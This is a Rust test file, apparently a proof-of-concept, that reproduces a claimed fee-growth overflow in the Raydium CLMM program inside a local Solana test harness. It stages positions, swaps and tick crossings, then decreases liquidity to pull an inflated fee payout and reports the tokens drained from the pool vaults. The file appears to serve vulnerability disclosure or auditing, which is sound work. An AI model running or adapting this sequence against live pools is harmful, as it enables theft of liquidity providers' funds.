use {
    anchor_lang::prelude::*,
    raydium_amm_v3,
    solana_program_test::*,
    solana_sdk::{
        hash::Hash, 
        signature::{Keypair, Signer}, 
        transaction::Transaction,
        program_pack::Pack,
    },
    spl_token::state::Account as TokenAccount,
};
mod test_utils;

#[cfg(test)]
mod program_test {

    use crate::test_utils::SetUpInfo;

    use super::*;

    pub fn program_entry_wrap(
        program_id: &Pubkey,
        accounts: &[AccountInfo],
        instruction_data: &[u8],
    ) -> anchor_lang::solana_program::entrypoint::ProgramResult {
        let accounts = Box::leak(Box::new(accounts.to_vec()));
        raydium_amm_v3::entry(program_id, accounts, instruction_data)
    }

    #[derive(Debug)]
    pub struct ExploitState {
        pub tick_lower: i32,
        pub tick_upper: i32,
        pub exploit_position_mint: Keypair,
        pub fee_growth_global_before: u128,
        pub fee_growth_global_after: u128,
    }

    async fn setup_exploit_conditions(
        setup_account: &SetUpInfo,
        wallet: &Keypair,
        payer: &Keypair,
        banks_client: &BanksClient,
        recent_blockhash: Hash,
    ) -> ExploitState {
        println!("=== PHASE 1: SETTING UP EXPLOIT CONDITIONS ===");
        
        // Step 1: Create pool at tick = 0
        println!("Step 1: Creating pool at tick = 0");
        let create_pool_instruction =
            test_utils::create_pool_ix(&setup_account, wallet.pubkey(), 0).unwrap();
        let mut transaction =
            Transaction::new_with_payer(&[create_pool_instruction], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet], recent_blockhash);
        banks_client.process_transaction(transaction).await.unwrap();

        // Step 2: Open base position [-500, 500] to provide liquidity
        println!("Step 2: Opening base position [-500, 500] for liquidity");
        let base_tick_lower = test_utils::tick_with_spacing(-500, setup_account.tick_spacing.into());
        let base_tick_upper = test_utils::tick_with_spacing(500, setup_account.tick_spacing.into());
        let base_position_mint = Keypair::new();
        
        let open_base_position = test_utils::open_position_ix(
            &setup_account,
            wallet.pubkey(),
            base_position_mint.pubkey(),
            base_tick_lower,
            base_tick_upper,
            1_000_000_000, // Large liquidity
        ).unwrap();
        
        let mut transaction =
            Transaction::new_with_payer(&[open_base_position], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet, &base_position_mint], recent_blockhash);
        banks_client.process_transaction(transaction).await.unwrap();

        // Step 3: Generate initial fee growth (target: ~100)
        println!("Step 3: Generating initial fee growth");
        let base_tick_array_lower = raydium_amm_v3::states::TickArrayState::get_array_start_index(
            base_tick_lower, setup_account.tick_spacing.into());
        let base_tick_array_upper = raydium_amm_v3::states::TickArrayState::get_array_start_index(
            base_tick_upper, setup_account.tick_spacing.into());

        // Small swap to generate fees while staying at tick 0
        let swap_instruction = test_utils::swap_ix(
            &setup_account,
            wallet.pubkey(),
            10_000_000, // Smaller amount to stay near tick 0
            true,
            raydium_amm_v3::libraries::get_sqrt_price_at_tick(-1).unwrap(),
            vec![base_tick_array_upper, base_tick_array_lower],
        ).unwrap();
        
        let mut transaction = Transaction::new_with_payer(&[swap_instruction], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet], recent_blockhash);
        banks_client.process_transaction(transaction).await.unwrap();

        // Swap back to tick 0
        let swap_back = test_utils::swap_ix(
            &setup_account,
            wallet.pubkey(),
            10_000_000,
            false,
            raydium_amm_v3::libraries::get_sqrt_price_at_tick(0).unwrap(),
            vec![base_tick_array_lower, base_tick_array_upper],
        ).unwrap();
        
        let mut transaction = Transaction::new_with_payer(&[swap_back], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet], recent_blockhash);
        banks_client.process_transaction(transaction).await.unwrap();

        // Check current fee growth
        let pool_account = banks_client.get_account(setup_account.pool_id).await.unwrap().unwrap();
        let pool_state = raydium_amm_v3::states::PoolState::try_deserialize(
            &mut pool_account.data.as_slice(),
        ).unwrap();
        
        let initial_fee_growth = pool_state.fee_growth_global_0_x64;
        let current_tick = pool_state.tick_current;
        println!("Initial fee_growth_global: {}, tick_current: {}", initial_fee_growth, current_tick);

        // Step 4: Initialize target ticks with specific values
        let target_tick_lower = test_utils::tick_with_spacing(-10, setup_account.tick_spacing.into());
        let target_tick_upper = test_utils::tick_with_spacing(10, setup_account.tick_spacing.into());
        
        println!("Step 4: Initializing tick_lower = {} at current price", target_tick_lower);
        // Open position that includes tick_lower to initialize it
        let init_position_mint = Keypair::new();
        let init_position = test_utils::open_position_ix(
            &setup_account,
            wallet.pubkey(),
            init_position_mint.pubkey(),
            target_tick_lower,
            50, // Upper bound above current price
            100_000_000,
        ).unwrap();
        
        let mut transaction = Transaction::new_with_payer(&[init_position], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet, &init_position_mint], recent_blockhash);
        banks_client.process_transaction(transaction).await.unwrap();

        // Step 5: Cross tick_upper by moving price beyond it
        println!("Step 5: Crossing tick_upper = {} by moving price to 15", target_tick_upper);
        let target_tick_array_lower = raydium_amm_v3::states::TickArrayState::get_array_start_index(
            target_tick_lower, setup_account.tick_spacing.into());
        let target_tick_array_upper = raydium_amm_v3::states::TickArrayState::get_array_start_index(
            target_tick_upper, setup_account.tick_spacing.into());

        let cross_swap = test_utils::swap_ix(
            &setup_account,
            wallet.pubkey(),
            50_000_000,
            false,
            raydium_amm_v3::libraries::get_sqrt_price_at_tick(15).unwrap(),
            vec![base_tick_array_lower, base_tick_array_upper, target_tick_array_lower, target_tick_array_upper],
        ).unwrap();
        
        let mut transaction = Transaction::new_with_payer(&[cross_swap], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet], recent_blockhash);
        banks_client.process_transaction(transaction).await.unwrap();

        // Step 6: Initialize tick_upper at current price (15)
        println!("Step 6: Initializing tick_upper = {} at current price 15", target_tick_upper);
        let init_upper_mint = Keypair::new();
        let init_upper_position = test_utils::open_position_ix(
            &setup_account,
            wallet.pubkey(),
            init_upper_mint.pubkey(),
            target_tick_upper,
            200, // Upper bound well above current price
            100_000_000,
        ).unwrap();
        
        let mut transaction = Transaction::new_with_payer(&[init_upper_position], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet, &init_upper_mint], recent_blockhash);
        banks_client.process_transaction(transaction).await.unwrap();

        // Step 7: Generate more fee growth at current position
        println!("Step 7: Generating additional fee growth");
        for _ in 0..3 {
            let swap1 = test_utils::swap_ix(
                &setup_account,
                wallet.pubkey(),
                20_000_000,
                true,
                raydium_amm_v3::libraries::get_sqrt_price_at_tick(10).unwrap(),
                vec![base_tick_array_lower, base_tick_array_upper, target_tick_array_lower, target_tick_array_upper],
            ).unwrap();
            
            let mut transaction = Transaction::new_with_payer(&[swap1], Some(&payer.pubkey()));
            transaction.sign(&[&payer, &wallet], recent_blockhash);
            banks_client.process_transaction(transaction).await.unwrap();

            let swap2 = test_utils::swap_ix(
                &setup_account,
                wallet.pubkey(),
                20_000_000,
                false,
                raydium_amm_v3::libraries::get_sqrt_price_at_tick(20).unwrap(),
                vec![base_tick_array_lower, base_tick_array_upper, target_tick_array_lower, target_tick_array_upper],
            ).unwrap();
            
            let mut transaction = Transaction::new_with_payer(&[swap2], Some(&payer.pubkey()));
            transaction.sign(&[&payer, &wallet], recent_blockhash);
            banks_client.process_transaction(transaction).await.unwrap();
        }

        // Step 8: Move price back into target range [tick_lower, tick_upper]
        println!("Step 8: Moving price back to tick = 5 (inside target range)");
        let return_swap = test_utils::swap_ix(
            &setup_account,
            wallet.pubkey(),
            100_000_000,
            true,
            raydium_amm_v3::libraries::get_sqrt_price_at_tick(5).unwrap(),
            vec![base_tick_array_lower, base_tick_array_upper, target_tick_array_lower, target_tick_array_upper],
        ).unwrap();
        
        let mut transaction = Transaction::new_with_payer(&[return_swap], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet], recent_blockhash);
        banks_client.process_transaction(transaction).await.unwrap();

        // Get final state
        let pool_account = banks_client.get_account(setup_account.pool_id).await.unwrap().unwrap();
        let pool_state = raydium_amm_v3::states::PoolState::try_deserialize(
            &mut pool_account.data.as_slice(),
        ).unwrap();
        
        let final_fee_growth = pool_state.fee_growth_global_0_x64;
        let current_tick = pool_state.tick_current;
        println!("Final fee_growth_global: {}, tick_current: {}", final_fee_growth, current_tick);
        println!("Setup complete - ready for exploit!");

        ExploitState {
            tick_lower: target_tick_lower,
            tick_upper: target_tick_upper,
            exploit_position_mint: Keypair::new(),
            fee_growth_global_before: initial_fee_growth,
            fee_growth_global_after: final_fee_growth,
        }
    }

    async fn execute_exploit(
        setup_account: &SetUpInfo,
        wallet: &Keypair,
        payer: &Keypair,
        banks_client: &BanksClient,
        recent_blockhash: Hash,
        exploit_state: ExploitState,
    ) {
        println!("=== PHASE 2: EXECUTING EXPLOIT ===");
        
        // Get initial vault balances
        let vault0_account = banks_client.get_account(setup_account.vault0).await.unwrap().unwrap();
        let vault0_initial = Pack::unpack(&vault0_account.data).map(|acc: TokenAccount| acc.amount).unwrap();
        
        let vault1_account = banks_client.get_account(setup_account.vault1).await.unwrap().unwrap();
        let vault1_initial = Pack::unpack(&vault1_account.data).map(|acc: TokenAccount| acc.amount).unwrap();
        
        println!("Initial vault balances - Token0: {}, Token1: {}", vault0_initial, vault1_initial);

        // Open exploit position in the vulnerable range
        println!("Opening exploit position at [{}, {}]", exploit_state.tick_lower, exploit_state.tick_upper);
        let exploit_position = test_utils::open_position_ix(
            &setup_account,
            wallet.pubkey(),
            exploit_state.exploit_position_mint.pubkey(),
            exploit_state.tick_lower,
            exploit_state.tick_upper,
            1_000_000, // Minimal liquidity
        ).unwrap();
        
        let mut transaction = Transaction::new_with_payer(&[exploit_position], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet, &exploit_state.exploit_position_mint], recent_blockhash);
        banks_client.process_transaction(transaction).await.unwrap();

        // Now decrease liquidity to trigger fee calculation and payout
        println!("Decreasing liquidity to trigger fee payout...");
        let decrease_liquidity = test_utils::decrease_liquidity_ix(
            &setup_account,
            wallet.pubkey(),
            exploit_state.exploit_position_mint.pubkey(),
            exploit_state.tick_lower,
            exploit_state.tick_upper,
            500_000, // Decrease half the liquidity
        ).unwrap();
        
        let mut transaction = Transaction::new_with_payer(&[decrease_liquidity], Some(&payer.pubkey()));
        transaction.sign(&[&payer, &wallet], recent_blockhash);
        
        // This should either succeed with massive payout or fail due to insufficient vault balance
        let result = banks_client.process_transaction(transaction).await;
        
        match result {
            Ok(_) => {
                println!("EXPLOIT SUCCESSFUL! Transaction completed.");
                
                // Check final vault balances
                let vault0_account = banks_client.get_account(setup_account.vault0).await.unwrap().unwrap();
                let vault0_final = Pack::unpack(&vault0_account.data).map(|acc: TokenAccount| acc.amount).unwrap();
                
                let vault1_account = banks_client.get_account(setup_account.vault1).await.unwrap().unwrap();
                let vault1_final = Pack::unpack(&vault1_account.data).map(|acc: TokenAccount| acc.amount).unwrap();
                
                println!("Final vault balances - Token0: {}, Token1: {}", vault0_final, vault1_final);
                println!("Tokens drained - Token0: {}, Token1: {}", 
                    vault0_initial.saturating_sub(vault0_final),
                    vault1_initial.saturating_sub(vault1_final));
                    
            },
            Err(e) => {
                println!("Transaction failed (likely due to insufficient vault balance): {:?}", e);
                println!("This confirms the overflow calculation would have drained more than available!");
            }
        }
    }

    #[tokio::test]
    async fn test_fee_growth_overflow_exploit() {
        println!("=== RAYDIUM CLMM FEE GROWTH OVERFLOW EXPLOIT POC ===");
        
        let wallet = Keypair::new();
        let mut program_test = ProgramTest::new(
            "raydium_amm_v3",
            raydium_amm_v3::id(),
            processor!(program_entry_wrap),
        );

        let setup_account = test_utils::setup(&mut program_test, &wallet.pubkey(), 10, 10000);
        let (banks_client, payer, recent_blockhash) = program_test.start().await;

        // Phase 1: Setup exploit conditions
        let exploit_state = setup_exploit_conditions(
            &setup_account,
            &wallet,
            &payer,
            &banks_client,
            recent_blockhash,
        ).await;

        // Phase 2: Execute the exploit
        execute_exploit(
            &setup_account,
            &wallet,
            &payer,
            &banks_client,
            recent_blockhash,
            exploit_state,
        ).await;
        
        println!("=== POC COMPLETED ===");
    }
}
